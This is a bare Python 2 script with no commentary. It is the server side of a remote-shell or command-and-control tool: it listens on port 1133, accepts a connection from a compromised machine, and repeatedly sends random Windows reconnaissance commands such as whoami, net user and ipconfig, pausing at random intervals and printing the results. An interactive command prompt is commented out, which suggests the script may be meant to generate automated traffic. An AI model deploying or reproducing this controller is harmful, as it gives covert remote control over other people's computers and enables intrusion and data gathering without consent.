import socket, os, sys, time, random

def socketCreate():
	try:
		global host
		global port
		global s
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = ''
		port = 1133

	except socket.error as msg:
		print "Socket creation error: " + str(msg[0])

def socketBind():
	try:
		print "Binding socket at port %s" % (port)
		s.bind((host, port))
		s.listen(1)
	except socket.error as msg:
		print "Socket binding error " + str(msg[0])
		print "Retrying..."
		socketBind()

def socketAccept():
	global conn
	global addr
	global hostname

	try:
		conn, addr = s.accept()
		print "[!] Session opened at %s:%s" % (addr[0], addr[1])
		print "\n"
		hostname = conn.recv(1024)
		menu()
	except socket.error as msg:
		s.close()
		print "Socket Accepting error " + str(msg[0])

def menu():
	while 1:
		try:
			cmd = ["ipconfig", "dir", "whoami", "ver", "net user"]#raw_input(str(addr[0]) + '@' + str(hostname) + '> ')
			cmd2choose = random.choice(cmd)
			# if cmd == 'quit':
			# 	conn.close()
			# 	sys.exit()
			print "Sending command " + cmd2choose
			command = conn.send(cmd2choose)
			result = conn.recv(16834)
			time.sleep(random.randint(5, 15))
			if result <> hostname:
				print result
		except Exception as e:
			print str(type(e)) + "\n"
			print "Session dead."

def main():
	socketCreate()
	socketBind()
	socketAccept()

main()